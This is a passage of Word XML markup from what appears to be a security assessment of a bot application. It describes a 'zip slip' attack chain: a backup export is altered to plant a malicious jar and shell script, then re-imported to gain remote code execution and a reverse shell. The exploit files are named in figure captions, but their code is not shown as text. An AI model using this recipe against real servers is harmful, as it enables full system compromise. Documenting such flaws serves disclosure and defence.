          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>it is not out of the question to take the path</w:t>
      </w:r>
      <w:r w:rsidRPr="00B4086D">
        <w:rPr>
          <w:rFonts w:ascii="Cambria Math" w:hAnsi="Cambria Math" w:cs="Cambria Math"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>‐</w:t>
      </w:r>
      <w:r w:rsidRPr="00B4086D">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>resolution mechanisms apart and forge one’s payload the application believes to be true, thus managing to read or do even worse on the server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1690EFC6" w14:textId="77777777" w:rsidR="00882917" w:rsidRDefault="00882917" w:rsidP="00882917">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00D01138">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="513D7EE3" wp14:editId="3F39A3C8">
            <wp:extent cx="5733415" cy="1167130"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>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3415" cy="1167130"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="514B4FB4" w14:textId="03F87FBF" w:rsidR="00882917" w:rsidRPr="00F85136" w:rsidRDefault="00882917" w:rsidP="00882917">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="67" w:name="_Ref199946219"/>
      <w:bookmarkStart w:id="68" w:name="_Ref199945769"/>
      <w:bookmarkStart w:id="69" w:name="_Ref199945316"/>
      <w:r>
        <w:t>Figure</w:t>
      </w:r>
      <w:bookmarkEnd w:id="67"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="68"/>
      <w:r>
        <w:t>: Code vulnerable to path manipulation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="69"/>
    </w:p>
    <w:p w14:paraId="5A700587" w14:textId="77777777" w:rsidR="00882917" w:rsidRPr="00882917" w:rsidRDefault="00882917" w:rsidP="00882917">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A4F1AF6" w14:textId="77777777" w:rsidR="00882917" w:rsidRDefault="00882917" w:rsidP="00882917">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00882917">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="675102C9" wp14:editId="54976610">
            <wp:extent cx="5733415" cy="908050"/>
            <wp:effectExtent l="0" t="0" r="635" b="6350"/>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3415" cy="908050"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B74D642" w14:textId="09C4F38F" w:rsidR="00882917" w:rsidRPr="00882917" w:rsidRDefault="00882917" w:rsidP="00882917">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="70" w:name="_Ref199945789"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="70"/>
      <w:r>
        <w:t xml:space="preserve">: JSON file in which a path manipulation </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>could be done</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A489DE6" w14:textId="04A09A5B" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="71" w:name="_Toc200039297"/>
      <w:r w:rsidRPr="005432B6">
        <w:lastRenderedPageBreak/>
        <w:t>Path Manipulation: Zip Entry Overwrite</w:t>
      </w:r>
      <w:bookmarkEnd w:id="71"/>
    </w:p>
    <w:p w14:paraId="02DF0FF2" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Given this vulnerability, it is possible to overwrite any file within the machine hosting the application, leading to a Remote Command Execution (RCE) vulnerability.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25A44299" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="003A2011">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:t>The exploit generates a valid zip file obtained from the endpoint /backup/export/{</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>bot_id</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:t xml:space="preserve">}. After obtaining a legitimate zip file via the backup export endpoint, the attacker can modify it locally to include malicious files, such as an exploit script or a malicious jar library. This is done by exploiting the vulnerability known as “zip slip,” which allows files to be inserted into the zip archive with paths pointing to sensitive directories on the target machine's file system. Once the manipulated </w:t>
      </w:r>
      <w:r w:rsidRPr="003A2011">
        <w:t>zip</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:t xml:space="preserve"> file is prepared, the attacker uploads it back to the application using the backup import feature.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CE3EB41" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>During the backup extraction phase, the system does not perform adequate checks on the paths of the files contained in the archive. As a result, malicious files are written directly to the desired locations on the server, overwriting existing files or adding new ones to critical directories. This allows arbitrary code to be introduced and executed, thus gaining full control of the machine hosting the application. In practice, the attacker can execute commands, read or modify sensitive data, and compromise the integrity and security of the entire system by exploiting a simple, seemingly harmless import operation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="532C848E" w14:textId="61C5D4A9" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Specifically (</w:t>
      </w:r>
      <w:r w:rsidR="00EE7FC5">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00EE7FC5">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199858984 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00EE7FC5">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00EE7FC5">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00EE7FC5">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>), we modified a class within the jar library, creating a malicious jar library that allows a shell to appear and execute arbitrary code, thus adding a static block (</w:t>
      </w:r>
      <w:r w:rsidR="00EE7FC5">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00EE7FC5">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199859063 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00EE7FC5">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00EE7FC5">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00EE7FC5">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>) that invokes a bash script (</w:t>
      </w:r>
      <w:r w:rsidR="00EE7FC5">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00EE7FC5">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199859012 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00EE7FC5">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00EE7FC5">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">) present on the machine (located in /tmp/exploit.sh via zip extraction). This static block is executed as soon as the class is loaded by the application's </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>classloader</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, without any additional interaction from the user or administrator, it puts the output of some command in a file that is accessible from a path traversal in the browser (</w:t>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199859155 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10BDC4C7" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">By leveraging these vulnerabilities, particularly the combination of </w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Zip Slip</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and the unsafe deserialization or loading of user-supplied classes, an attacker can also </w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>spawn a reverse shell</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> to establish persistent access to the compromised system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE34444" w14:textId="77777777" w:rsidR="003A2011" w:rsidRDefault="001A39A9" w:rsidP="003A2011">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:after="120"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="22E99EED" wp14:editId="07777777">
            <wp:extent cx="5731200" cy="2959100"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="35"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5"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731200" cy="2959100"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="72CE5B7F" w14:textId="0BED0817" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="003A2011" w:rsidP="003A2011">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="72" w:name="_Ref199858984"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="72"/>
      <w:r>
        <w:t>: e</w:t>
      </w:r>
      <w:r w:rsidRPr="00C01C71">
        <w:t>xploit.py file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5784B3B6" w14:textId="77777777" w:rsidR="003A2011" w:rsidRPr="005432B6" w:rsidRDefault="003A2011">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12525610" w14:textId="13B93088" w:rsidR="00910649" w:rsidRDefault="001A39A9" w:rsidP="00EE7FC5">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:after="120"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="6E894B45" wp14:editId="07777777">
            <wp:extent cx="5731200" cy="3644900"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="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6"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731200" cy="3644900"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="734EACFC" w14:textId="13CDDC30" w:rsidR="00EE7FC5" w:rsidRDefault="00EE7FC5" w:rsidP="00EE7FC5">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="73" w:name="_Ref199859012"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>9</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="73"/>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="00711A6E">
        <w:t>Figure 5: exploit.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA226A1" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D177BFA" w14:textId="77777777" w:rsidR="00EE7FC5" w:rsidRDefault="001A39A9" w:rsidP="00EE7FC5">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:after="120"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="58D927E5" wp14:editId="07777777">
            <wp:extent cx="5731200" cy="2552700"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="29"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7"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731200" cy="2552700"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="28FBDBFF" w14:textId="68CAC3F2" w:rsidR="00EE7FC5" w:rsidRDefault="00EE7FC5" w:rsidP="00EE7FC5">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="74" w:name="_Ref199859063"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>10</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="74"/>
      <w:r w:rsidR="001A39A9">
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="001A39A9" w:rsidRPr="00DA2157">
        <w:t>Explode.java file that spawn the shell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FCC30C2" w14:textId="6F9E0AF6" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="097CA132" w14:textId="77777777" w:rsidR="00EE7FC5" w:rsidRDefault="001A39A9" w:rsidP="00EE7FC5">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:after="120"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="3ED146E8" wp14:editId="4C779A89">
            <wp:extent cx="6035040" cy="1657985"/>
            <wp:effectExtent l="0" t="0" r="3810" b="0"/>
            <wp:docPr id="1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rotWithShape="1">
                    <a:blip r:embed="rId18"/>
                    <a:srcRect r="21706"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6094099" cy="1674210"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C1C55A5" w14:textId="6F503B19" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="00EE7FC5" w:rsidP="00BD4BC4">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:del w:id="75" w:author="Microsoft Word" w:date="2025-06-04T17:34:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="76" w:name="_Ref199859155"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>11</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="76"/>
      <w:r w:rsidR="001A39A9">
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:t>P</w:t>
      </w:r>
      <w:r w:rsidRPr="00F63E7A">
        <w:t>ath</w:t>
      </w:r>
      <w:r w:rsidR="001A39A9" w:rsidRPr="00F63E7A">
        <w:t xml:space="preserve"> traversal to output file for malicious shell</w:t>
      </w:r>
      <w:del w:id="77" w:author="Microsoft Word" w:date="2025-06-04T17:34:00Z">
        <w:r w:rsidR="001A39A9" w:rsidRPr="005432B6">
          <w:delText>Poor Error Handling: Overly Broad Catch</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="43B09B12" w14:textId="57ADAFE3" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00BD4BC4">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:del w:id="78" w:author="Microsoft Word" w:date="2025-06-04T17:34:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="79" w:author="Microsoft Word" w:date="2025-06-04T17:34:00Z">
        <w:r w:rsidRPr="005432B6">
          <w:delText>Poor Error Handling: Overly Broad Throws</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="71939D53" w14:textId="3D41823D" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00BD4BC4">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:del w:id="80" w:author="Microsoft Word" w:date="2025-06-04T17:34:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="81" w:author="Microsoft Word" w:date="2025-06-04T17:34:00Z">
        <w:r w:rsidRPr="005432B6">
          <w:delText>Poor Logging Practice: Use of a System Output Stream</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4165BB4C" w14:textId="152E31C8" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00BD4BC4">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:del w:id="82" w:author="Microsoft Word" w:date="2025-06-04T17:34:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="83" w:author="Microsoft Word" w:date="2025-06-04T17:34:00Z">
        <w:r w:rsidRPr="005432B6">
          <w:delText>Poor Style: Confusing Naming</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="467ABC8C" w14:textId="28389468" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00BD4BC4">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:del w:id="84" w:author="Microsoft Word" w:date="2025-06-04T17:34:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="85" w:author="Microsoft Word" w:date="2025-06-04T17:34:00Z">
        <w:r w:rsidRPr="005432B6">
          <w:delText>Poor Style: Value Never Read</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="3DB00E56" w14:textId="0D8A9D99" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00BD4BC4">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:del w:id="86" w:author="Microsoft Word" w:date="2025-06-04T17:34:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="87" w:author="Microsoft Word" w:date="2025-06-04T17:34:00Z">
        <w:r w:rsidRPr="005432B6">
          <w:delText>Portability Flaw: Locale Dependent Comparison</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="680A4E5D" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="00910649" w:rsidP="00BD4BC4">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7AB7AA26" w14:textId="19CCA351" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="88" w:name="_Toc200039298"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Privacy Violation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="88"/>
    </w:p>
    <w:p w14:paraId="17381567" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
